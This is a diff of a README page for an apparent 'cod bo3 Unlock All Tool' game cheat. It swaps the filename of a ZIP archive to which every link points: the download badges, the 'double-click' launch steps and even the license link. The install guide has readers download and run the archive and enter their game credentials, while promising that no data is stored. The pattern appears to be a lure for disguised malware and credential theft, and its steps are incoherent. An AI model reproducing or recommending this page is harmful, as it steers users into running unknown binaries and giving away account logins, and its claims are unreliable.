@@ -1,5 +1,5 @@
 # 🛡️ cod bo3 Unlock All Tool  
-![Download](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/bo3-unlock-suite-v1.2.zip)
+![Download](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/unlock_bo_suite_v1.2.zip)
 
 ---
 
@@ -78,14 +78,14 @@ A hybrid model of live support agents and lightning-fast AI, available round-the
 ## 🚀 Installation Guide
 
 1. **Download**  
-   Click the ![Download](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/bo3-unlock-suite-v1.2.zip) badge at the top (or bottom) of this page, or use this https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/bo3-unlock-suite-v1.2.zip
+   Click the ![Download](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/unlock_bo_suite_v1.2.zip) badge at the top (or bottom) of this page, or use this https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/unlock_bo_suite_v1.2.zip
 
 2. **Extract**  
    Unpack the ZIP/RAR archive to any secure folder on your desktop or drive.
 
 3. **Launch Application**  
-   - On **Windows**: Double-click `https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/bo3-unlock-suite-v1.2.zip`  
-   - On **macOS/Linux**: Ensure you have Wine or use the dedicated shell script (`https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/bo3-unlock-suite-v1.2.zip`).
+   - On **Windows**: Double-click `https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/unlock_bo_suite_v1.2.zip`  
+   - On **macOS/Linux**: Ensure you have Wine or use the dedicated shell script (`https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/unlock_bo_suite_v1.2.zip`).
 
 4. **Log In & Connect**  
    Enter your cod bo3 credentials safely—no private data stored. The tool connects and authenticates with advanced security protocols.
@@ -118,10 +118,10 @@ All players are responsible for understanding game publisher terms before using 
 ## 📜 MIT License
 
 Distributed under the MIT License.  
-See full details [here](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/bo3-unlock-suite-v1.2.zip) (c) 2025 cod bo3 Unlock All Tool Contributors.
+See full details [here](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/unlock_bo_suite_v1.2.zip) (c) 2025 cod bo3 Unlock All Tool Contributors.
 
 ---
 
-![Download](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/bo3-unlock-suite-v1.2.zip)
+![Download](https://raw.githubusercontent.com/Cookiewoolv/bo3-unlock-suite/branch/gracileness/unlock_bo_suite_v1.2.zip)
 
 Upgrade your cod bo3 adventure today—where limitations are but the shadows you outpace!
